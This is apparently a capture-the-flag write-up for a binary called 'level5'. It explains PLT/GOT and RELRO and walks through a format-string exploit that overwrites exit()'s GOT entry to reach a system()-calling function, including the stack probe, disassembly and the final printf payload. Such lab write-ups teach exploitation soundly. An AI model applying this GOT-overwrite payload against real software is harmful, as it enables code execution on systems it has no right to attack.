The main function contains a function n(), which calls for printf and then exit(). Exploring the code, we discover that the most interesting function o(), which calls system(), is not used.
To get the flag, **we must overwrite exit() towards o().**

1. Check the stack's position of our input:

```
python -c 'print("AAAA " + "%x " * 20)' | ./level5
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a20 
```

41414141 is AAAA in hexadecimal, so our input is displayed at the **4th position** in the binary's stack.

2. Get the address of o and exit in the GOT in Ghidra:

```
080484a4 <o>

080483d0 <exit@plt>:
 80483d0:	ff 25 38 98 04 08    	jmp    *0x8049838
 80483d6:	68 28 00 00 00       	push   $0x28
 80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>

080484c2 <n>:
 80484c2:	55                   	push   %ebp
 80484c3:	89 e5                	mov    %esp,%ebp
 80484c5:	81 ec 18 02 00 00    	sub    $0x218,%esp
 80484cb:	a1 48 98 04 08       	mov    0x8049848,%eax
 80484d0:	89 44 24 08          	mov    %eax,0x8(%esp)
 80484d4:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
 80484db:	00 
 80484dc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484e2:	89 04 24             	mov    %eax,(%esp)
 80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
 80484ea:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484f0:	89 04 24             	mov    %eax,(%esp)
 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
 80484f8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>

```

It is essential to understand what are **PLT (Procedure Linkage Table) and GOT(Global Offset Table)** for this level. They are the ELF's sections that handle **dynamic linking**.
For instance, when we call exit(), the executable compiles it as exit@plt, because it does not know where the function is, and will go to the PLT entry of exit. From here, it will jump to the address stored in the GOT entry. The GOT contains lots of addresses which are actual locations in memory of the libc function. However, GOT overwriting is only possible when **RELRO security is disabled**, as opposed to Full RELRO where GOT is in read-only.
In this executable, n() calls exit@plt, and inside it goes to the GOT with the instruction `jmp    *0x8049838`. We will overwrite it so that the GOT calls the o() function.

3. Let's attack:

As such, the payload will follow this pattern:

```
GOT address of exit() + o() address in decimal - 4 (because we used the GOT address)
```

Therefore:

```
python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /var/crash/attack
cat /var/crash/attack - | ./level5
```

The command means:
- `\x38\x98\x04\x08` is the address of exit() in the GOT
- `%134513824d` is 080484a4 (o function) in decimal - 4
- `4$` means the fourth position / argument
- `%n` will assign to the pointer the number of character written so far

We now have the flag to go to the next level.